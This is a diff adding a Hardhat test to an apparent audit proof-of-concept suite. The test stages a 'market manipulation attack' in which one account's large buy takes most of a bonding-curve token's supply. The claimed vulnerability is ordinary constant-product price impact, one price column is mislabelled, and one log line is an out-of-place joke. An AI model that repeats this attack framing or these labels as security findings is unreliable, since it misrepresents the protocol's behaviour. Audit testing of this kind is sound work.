@@ -249,4 +249,166 @@ describe("C4 PoC Test Suite", function () {
     ).to.be.revertedWithCustomError(upsideProtocol, "InvalidSetting");
     console.log("Fee setting correctly reverted with division by zero protection");
   });
+
+  it("should demonstrate bonding curve market manipulation vulnerability", async function () {
+    console.log("=== BONDING CURVE MARKET MANIPULATION TEST ===");
+    
+    // Set minimal fees to isolate the bonding curve math
+    await upsideProtocol.connect(owner).setFeeInfo({
+      tokenizeFeeEnabled: false,
+      tokenizeFeeDestinationAddress: owner.address,
+      swapFeeStartingBp: 100,      // 1% fee only
+      swapFeeDecayBp: 0,           // No decay
+      swapFeeDecayInterval: 86400,
+      swapFeeFinalBp: 100,
+      swapFeeDeployerBp: 1000,
+      swapFeeSellBp: 100,
+    });
+    
+    // Skip time to get minimal fees
+    await network.provider.send("evm_increaseTime", [86400 * 30]);
+    await network.provider.send("evm_mine");
+    
+    // Visualize the bonding curve vulnerability
+    console.log("\n1. BONDING CURVE ANALYSIS:");
+    console.log("Trade Size | Tokens Out | Price/Token | % of Supply | Slippage");
+    console.log("-----------|------------|-------------|-------------|----------");
+    
+    const INITIAL_USDC = 10000;
+    const INITIAL_TOKENS = 1000000;
+    
+    const tradeSizes = [1000, 5000, 10000, 25000, 50000, 100000];
+    
+    for (let tradeSize of tradeSizes) {
+      // Current protocol formula: tokensOut = (tokenReserves * usdcIn) / (usdcReserves + usdcIn)
+      const tokensOut = (INITIAL_TOKENS * tradeSize) / (INITIAL_USDC + tradeSize);
+      const pricePerToken = tradeSize / tokensOut;
+      const percentOfSupply = (tokensOut / INITIAL_TOKENS) * 100;
+      
+      // Calculate slippage vs initial price
+      const initialPrice = INITIAL_USDC / INITIAL_TOKENS; // $0.01
+      const slippage = ((pricePerToken / initialPrice) - 1) * 100;
+      
+      console.log(`$${tradeSize.toString().padStart(9)} | ${tokensOut.toFixed(0).padStart(10)} | $${pricePerToken.toFixed(6).padStart(10)} | ${percentOfSupply.toFixed(1).padStart(10)}% | ${slippage.toFixed(1).padStart(7)}%`);
+    }
+    
+    console.log("\n2. MARKET MANIPULATION ATTACK:");
+    
+    // Attacker 1: Corner the market with large buy
+    const attackerCapital = ethers.parseUnits("50000", 6); // 50k USDC
+    await (liquidityToken as any).mint(attacker.address, attackerCapital);
+    await liquidityToken.connect(attacker).approve(await upsideProtocol.getAddress(), attackerCapital);
+    
+    // Get initial state
+    const initialInfo = await upsideProtocol.metaCoinInfoMap(await metaCoin.getAddress());
+    console.log(`Initial USDC reserves: ${ethers.formatUnits(initialInfo.liquidityTokenReserves, 6)}`);
+    console.log(`Initial MetaCoin reserves: ${ethers.formatUnits(initialInfo.metaCoinReserves, 18)}`);
+    
+    // Execute large buy to corner market
+    const attackerBalance1 = await metaCoin.balanceOf(attacker.address);
+    console.log(`Attacker balance before: ${ethers.formatUnits(attackerBalance1, 18)} tokens`);
+    
+    const tokensReceived = await upsideProtocol.connect(attacker).swap.staticCall(
+      await metaCoin.getAddress(),
+      true,
+      attackerCapital,
+      0,
+      attacker.address
+    );
+    
+    console.log(`Attacker buying with ${ethers.formatUnits(attackerCapital, 6)} USDC...`);
+    await upsideProtocol.connect(attacker).swap(
+      await metaCoin.getAddress(),
+      true,
+      attackerCapital,
+      0,
+      attacker.address
+    );
+    
+    const attackerBalance2 = await metaCoin.balanceOf(attacker.address);
+    const tokensAcquired = attackerBalance2 - attackerBalance1;
+    
+    console.log(`Tokens acquired: ${ethers.formatUnits(tokensAcquired, 18)}`);
+    console.log(`Market share: ${((Number(ethers.formatUnits(tokensAcquired, 18)) / 1000000) * 100).toFixed(1)}%`);
+    
+    // Check new reserves after attack
+    const newInfo = await upsideProtocol.metaCoinInfoMap(await metaCoin.getAddress());
+    console.log(`New USDC reserves: ${ethers.formatUnits(newInfo.liquidityTokenReserves, 6)}`);
+    console.log(`New MetaCoin reserves: ${ethers.formatUnits(newInfo.metaCoinReserves, 18)}`);
+    
+    // Now demonstrate how this affects other users
+    console.log("\n3. IMPACT ON OTHER USERS:");
+    
+    // Regular user tries to buy after the attack
+    const regularUserAmount = ethers.parseUnits("1000", 6); // 1k USDC
+    await (liquidityToken as any).mint(user.address, regularUserAmount);
+    await liquidityToken.connect(user).approve(await upsideProtocol.getAddress(), regularUserAmount);
+    
+    const userTokensOut = await upsideProtocol.connect(user).swap.staticCall(
+      await metaCoin.getAddress(),
+      true,
+      regularUserAmount,
+      0,
+      user.address
+    );
+    
+    const userPricePerToken = Number(ethers.formatUnits(regularUserAmount, 6)) / Number(ethers.formatUnits(userTokensOut, 18));
+    const attackerPricePerToken = Number(ethers.formatUnits(attackerCapital, 6)) / Number(ethers.formatUnits(tokensAcquired, 18));
+    
+    console.log(`Regular user (1k USDC) gets: ${ethers.formatUnits(userTokensOut, 18)} tokens`);
+    console.log(`Regular user price per token: $${userPricePerToken.toFixed(6)}`);
+    console.log(`Attacker price per token: $${attackerPricePerToken.toFixed(6)}`);
+    console.log(`Price difference: ${((userPricePerToken / attackerPricePerToken - 1) * 100).toFixed(1)}% more expensive`);
+    
+    // Verify the vulnerability
+    const marketSharePercentage = (Number(ethers.formatUnits(tokensAcquired, 18)) / 1000000) * 100;
+    expect(marketSharePercentage).to.be.gt(70); // Should get >70% market share
+    
+    console.log(`Attacker cornered ${marketSharePercentage.toFixed(1)}% of the market`);
+    console.log(`Regular users pay ${((userPricePerToken / attackerPricePerToken - 1) * 100).toFixed(1)}% more`);
+    
+    if (marketSharePercentage > 70) {
+      console.log("CRITICAL: oh husband market manipulation attack successful now wife and kids no longer have home");
+    }
+  });
+
+  // Helper function to visualize bonding curve
+  function visualizeBondingCurve() {
+    console.log("\n=== BONDING CURVE MATHEMATICAL VISUALIZATION ===");
+    console.log("This demonstrates the hyperbolic nature of the current formula");
+    console.log("Formula: tokensOut = (tokenReserves * usdcIn) / (usdcReserves + usdcIn)");
+    console.log();
+    
+    const INITIAL_USDC = 10000;
+    const INITIAL_TOKENS = 1000000;
+    
+    console.log("USDC Input | Token Output | Marginal Price | Total Price | Remaining %");
+    console.log("-----------|--------------|----------------|-------------|------------");
+    
+    let cumulativeUSDC = 0;
+    let cumulativeTokens = 0;
+    let remainingTokens = INITIAL_TOKENS;
+    let remainingUSDC = INITIAL_USDC;
+    
+    const increments = [1000, 2000, 5000, 10000, 20000, 30000, 50000];
+    
+    for (let increment of increments) {
+      // Calculate tokens out for this increment
+      const tokensOut = (remainingTokens * increment) / (remainingUSDC + increment);
+      
+      // Update cumulative values
+      cumulativeUSDC += increment;
+      cumulativeTokens += tokensOut;
+      remainingTokens -= tokensOut;
+      remainingUSDC += increment;
+      
+      // Calculate prices
+      const marginalPrice = increment / tokensOut;
+      const totalAvgPrice = cumulativeUSDC / cumulativeTokens;
+      const remainingPercent = (remainingTokens / INITIAL_TOKENS) * 100;
+      
+      console.log(`$${increment.toString().padStart(9)} | ${tokensOut.toFixed(0).padStart(12)} | $${marginalPrice.toFixed(6).padStart(13)} | $${totalAvgPrice.toFixed(6).padStart(10)} | ${remainingPercent.toFixed(1).padStart(9)}%`);
+    }
+    
+  }
 });
